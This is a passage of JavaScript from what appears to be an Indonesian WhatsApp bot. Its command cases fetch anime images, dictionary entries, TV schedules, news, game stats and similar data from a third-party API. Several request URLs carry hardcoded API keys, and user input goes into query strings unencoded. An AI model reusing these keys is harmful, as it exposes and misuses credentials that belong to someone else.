          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Historia', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'sasha': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=sasha`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sasha', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break  
//=============================================  
case 'boruto': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=boruto`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Boruto', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break  
//=============================================  
case 'sarada': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=sarada`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sarada', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'sasuke': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=sasuke`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sasuke', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//=============================================      
case 'sasuke': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=sasuke`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sasuke', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break    
//============================================= 
case 'madara': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=madara`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Madara', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break   
//============================================= 
case 'obito': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=obito`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Obito', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break  
//============================================= 
case 'kanao': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=kanao`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Kanao', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break  
//============================================= 
case 'sayu': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=sayu`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'sayu', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'yoshida': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=yoshida`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Yoshida', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'airi': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=airi`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Airi', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'asami': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=asami`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Asami', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'yuzuha': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=yuzuha`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Yuzuha', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'luffy': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=luffy`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Luffy', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'hashimoto': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=hashimoto`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Hashimoto', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'tanLarasCans': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=tanLarasCans`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'TanLarasCans', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'nezuko': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=nezuko`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Nezuko', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'ichika': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=ichika`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Ichika', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'zenitsu': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=zenitsu`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Zenitsu', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'giyu': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=giyu`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Giyu', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'sakonji': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=sakonji`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sakonji', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//=============================================         
case 'inosuke': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=inosuke`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Inosuke', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'zoro': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=zoro`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Zoro', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//=============================================  
case 'sanji': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=sanji`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'sanji', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//=============================================  
case 'gon': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=gon`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Gon', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//=============================================  
case 'killua': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=killua`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Killua', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//=============================================  
case 'sagiri': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=sagiri`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sagiri', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break
//============================================= 
case 'taiko': case 'natsu': case 'genos': case 'saitama': case 'miku':
  kontoll = args.join (' ')
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=${kontoll}`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'NEXT', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================
case 'animefanart': 
					buff = await getBuffer(`https://api.lolhuman.xyz/api/random/animefanart?apikey=WannOff`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Animefanart', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break  
//=============================================  
case 'megumin': 
					buff = await getBuffer(`https://api.lolhuman.xyz/api/random/megumin?apikey=WannOff`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Megumin', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break  
					
					case 'kbbi':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Example: ${prefix + command} kursi`)
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/kbbi?apikey=WannOff&query=${args.join(" ")}`)
               lila = get_result.result
               ini_txt = `\`\`\`Kata : ${lila[0].nama}\`\`\`\n`
               ini_txt += `\`\`\`Kata Dasar : ${lila[0].kata_dasar}\`\`\`\n`
               ini_txt += `\`\`\`Pelafalan : ${lila[0].pelafalan}\`\`\`\n`
               ini_txt += `\`\`\`Bentuk Tidak Baku : ${lila[0].bentuk_tidak_baku}\`\`\`\n\n`
               for (var x of lila) {
                   ini_txt += `\`\`\`Kode : ${x.makna[0].kelas[0].kode}\`\`\`\n`
                   ini_txt += `\`\`\`Kelas : ${x.makna[0].kelas[0].nama}\`\`\`\n`
                   ini_txt += `\`\`\`Artinya : \n${x.makna[0].kelas[0].deskripsi}\`\`\`\n\n`
                   ini_txt += `\`\`\`Makna Lain : \n${x.makna[0].submakna}\`\`\`\n `
                   ini_txt += `\`\`\`Contoh Kalimat : \n${x.makna[0].contoh}\`\`\`\n`
               }
               reply(ini_txt)
               break
//=========================================================
case 'jarak':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Example: ${prefix + command} jakarta - yogyakarta`)
               pauls = args.join(" ")
               teks1 = pauls.split("-")[0].trim()
               teks2 = pauls.split("-")[1].trim()
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/jaraktempuh?apikey=WannOff&kota1=${teks1}&kota2=${teks2}`)
               x = get_result.result
               ini_txt = `Informasi Jarak dari ${teks1} ke ${teks2} :\n\n`
               ini_txt += `\`\`\`◪ Asal :\`\`\` ${x.from.name}\n`
               ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.from.latitude}\n`
               ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.from.longitude}\n\n`
               ini_txt += `\`\`\`◪ Tujuan :\`\`\` ${x.to.name}\n`
               ini_txt += `\`\`\`◪ Garis Lintang :\`\`\` ${x.to.latitude}\n`
               ini_txt += `\`\`\`◪ Garis Bujur :\`\`\` ${x.to.longitude}\n\n`
               ini_txt += `\`\`\`◪ Jarak Tempuh :\`\`\` ${x.jarak}\n`
               ini_txt += `\`\`\`◪ Waktu Tempuh :\`\`\`\n`
               ini_txt += `   ╭───────────────❏\n`
               ini_txt += `❍┤ Kereta Api : ${x.kereta_api}\n`
               ini_txt += `❍┤ Pesawat : ${x.pesawat}\n`
               ini_txt += `❍┤ Mobil : ${x.mobil}\n`
               ini_txt += `❍┤ Motor : ${x.motor}\n`
               ini_txt += `❍┤ Jalan Kaki : ${x.jalan_kaki}\n`
               ini_txt += `   ╰───────────────❏\n`
               reply(ini_txt)
               break
//=========================================================
case 'urbandictionary':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               urb = args.join(" ")
               get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/urdict?apikey=WannOff&query=${urb}`)
               lilu = get_result.result
               for (var x of lilu) {
                   ini_txt = `\`\`\`Meaning :\n${x.definition}\`\`\`\n\n`
                   ini_txt += `\`\`\`Link : ${x.permalink}\`\`\`\n\n`
                   ini_txt += `\`\`\`Sounds Url : ${x.sound_urls[0]}\`\`\`\n\n`
                   ini_txt += `\`\`\`Like : ${x.thumbs_up}\`\`\`\n\n`
                   ini_txt += `\`\`\`Dislike : ${x.thumbs_down}\`\`\`\n\n`
                   ini_txt += `\`\`\`Created On : \n${x.written_on}\`\`\`\n\n`
                   ini_txt += `\`\`\`Author : ${x.author}\`\`\`\n\n`
                   ini_txt += `\`\`\`Word : ${x.word}\`\`\`\n\n`
                   ini_txt += `\`\`\`Defined Id : ${x.defid}\`\`\`\n\n`
                   ini_txt += `\`\`\`Example : ${x.example}\`\`\`\n\n`
               }
               reply(ini_txt)
               break
//=========================================================
case 'jadwaltv':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Example: ${prefix + command} RCTI`)
               channel = args[0]
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/${channel}?apikey=WannOff`)
               get_result = get_result.result
               ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
               for (var x in get_result) {
                   ini_txt += `${x} - ${get_result[x]}\n`
               }
               reply(ini_txt)
               break
//=========================================================
case 'jadwaltvnow':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwaltv/now?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = `Jadwal TV Now :\n`
  for (var x in get_result) {
      ini_txt += `${x.toUpperCase()}${get_result[x]}\n\n`
  }
  reply(ini_txt)
  break
//=========================================================
case 'jadwalbola':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadwalbola?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = "Jadwal Bola :\n"
  for (var x of get_result) {
      ini_txt += `Hari : ${x.hari}\n`
      ini_txt += `Jam : ${x.jam}\n`
      ini_txt += `Event : ${x.event}\n`
      ini_txt += `Match : ${x.match}\n`
      ini_txt += `TV : ${x.tv}\n\n`
  }
  reply(ini_txt)
  break
//=========================================================
case 'heroml':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Example: ${prefix + command} Fanny`)
               hero = args.join(" ")
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/heroml/${hero}?apikey=IkyAds`)
               get_result = get_result.result
               ini_txt = `Name : ${get_result.hero_name}\n`
               ini_txt += `Entrance Quotes : ${get_result.ent_quotes}\n`
               ini_txt += `Role : ${get_result.detail.role}\n`
               ini_txt += `Specialty : ${get_result.detail.specialty}\n`
               ini_txt += `Laning : ${get_result.detail.laning_recommendation}\n`
               ini_txt += `Release : ${get_result.detail.release_date}\n`
               ini_txt += `Movement speed : ${get_result.attr.movement_speed}\n`
               ini_txt += `Physical attack : ${get_result.attr.physical_attack}\n`
               ini_txt += `Magic power : ${get_result.attr.magic_power}\n`
               ini_txt += `Physical defense : ${get_result.attr.physical_defense}\n`
               ini_txt += `Magic defense : ${get_result.attr.magic_defense}\n`
               ini_txt += `Critical rate : ${get_result.attr.basic_atk_crit_rate}\n`
               ini_txt += `Hp : ${get_result.attr.hp}\n`
               ini_txt += `Mana : ${get_result.attr.mana}\n`
               ini_txt += `Mana regen : ${get_result.attr.mana_regen}\n`
               ini_icon = await getBuffer(get_result.icon)
               await wann.sendMessage(from, ini_icon, image, { quoted: freply, caption: ini_txt })
               break
//=========================================================
case 'mlstalk':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Example: ${prefix + command} 84830127/2169`)
               ml_id = args[0]
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${ml_id}?apikey=WannOff`)
               reply(get_result.result)
               break
//=========================================================
case 'genshin':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Example: ${prefix + command} jean`)
               hero = args.join(" ")
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/genshin/${hero}?apikey=WannOff`)
               get_result = get_result.result
               ini_txt = `Name : ${get_result.title}\n`
               ini_txt += `Intro : ${get_result.intro}\n`
               ini_txt += `Icon : ${get_result.icon}\n`
               ini_icon = await getBuffer(get_result.cover1)
               await wann.sendMessage(from, ini_icon, image, { quoted: freply, caption: ini_txt })
               ini_voice = await getBuffer(get_result.cv[0].audio[0])
               await wann.sendMessage(from, ini_voice, audio, { quoted: freply, mimetype: Mimetype.mp4Audio })
               break
//=========================================================
case 'wikipedia':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
                 if (args.length == 0) return reply(`Example: ${prefix + command} Tahu`)
                 query = args.join(" ")
                 get_result = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=WannOff&query=${query}`)
                 get_result = get_result.result
                 reply(get_result)
                 break
//=========================================================
case 'translate':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Example: ${prefix + command} en Tahu Bacem`)
               kode_negara = args[0]
               args.shift()
               ini_txt = args.join(" ")
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/translate/auto/${kode_negara}?apikey=WannOff&text=${ini_txt}`)
               get_result = get_result.result
               init_txt = `From : ${get_result.from}\n`
               init_txt += `To : ${get_result.to}\n`
               init_txt += `Original : ${get_result.original}\n`
               init_txt += `Translated : ${get_result.translated}\n`
               init_txt += `Pronunciation : ${get_result.pronunciation}\n`
               reply(init_txt)
               break
//=========================================================
case 'newsinfo':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/newsinfo?apikey=WannOff`)
               get_result = get_result.result
               ini_txt = "Result :\n"
               for (var x of get_result) {
                   ini_txt += `Title : ${x.title}\n`
                   ini_txt += `Author : ${x.author}\n`
                   ini_txt += `Source : ${x.source.name}\n`
                   ini_txt += `Url : ${x.url}\n`
                   ini_txt += `Published : ${x.publishedAt}\n`
                   ini_txt += `Description : ${x.description}\n\n`
               }
               reply(ini_txt)
               break
//=========================================================
case 'cnnindonesia':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = "Result :\n"
  for (var x of get_result) {
      ini_txt += `Judul : ${x.judul}\n`
      ini_txt += `Link : ${x.link}\n`
      ini_txt += `Tipe : ${x.tipe}\n`
      ini_txt += `Published : ${x.waktu}\n\n`
  }
  reply(ini_txt)
  break
//=========================================================
case 'cnnnasional':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
  get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/nasional?apikey=WannOff`)
  get_result = get_result.result
  ini_txt = "Result :\n"
  for (var x of get_result) {
      ini_txt += `Judul : ${x.judul}\n`
      ini_txt += `Link : ${x.link}\n`
      ini_txt += `Tipe : ${x.tipe}\n`
      ini_txt += `Published : ${x.waktu}\n\n`
  }
  reply(ini_txt)
  break
//=========================================================
case 'cnninternasional':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/cnnindonesia/internasional?apikey=WannOff`)
               get_result = get_result.result
               ini_txt = "Result :\n"
               for (var x of get_result) {
                   ini_txt += `Judul : ${x.judul}\n`
                   ini_txt += `Link : ${x.link}\n`
                   ini_txt += `Tipe : ${x.tipe}\n`
                   ini_txt += `Published : ${x.waktu}\n\n`
               }
               reply(ini_txt)
               break
//=========================================================
case 'infogempa':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=WannOff`)
               get_result = get_result.result
               ini_txt = `Lokasi : ${get_result.lokasi}\n`
               ini_txt += `Waktu : ${get_result.waktu}\n`
               ini_txt += `Potensi : ${get_result.potensi}\n`
               ini_txt += `Magnitude : ${get_result.magnitude}\n`
               ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
               ini_txt += `Koordinat : ${get_result.koordinat}`
               get_buffer = await getBuffer(get_result.map)
               await wann.sendMessage(from, get_buffer, image, { quoted: freply, caption: ini_txt })
               break
//=========================================================
case 'lirik':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
               if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
               query = args.join(" ")
               get_result = await fetchJson(`https://api.lolhuman.xyz/api/lirik?apikey=WannOff&query=${query}`)
               reply(get_result.result)
               break
//=========================================================
case 'cuaca':
  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
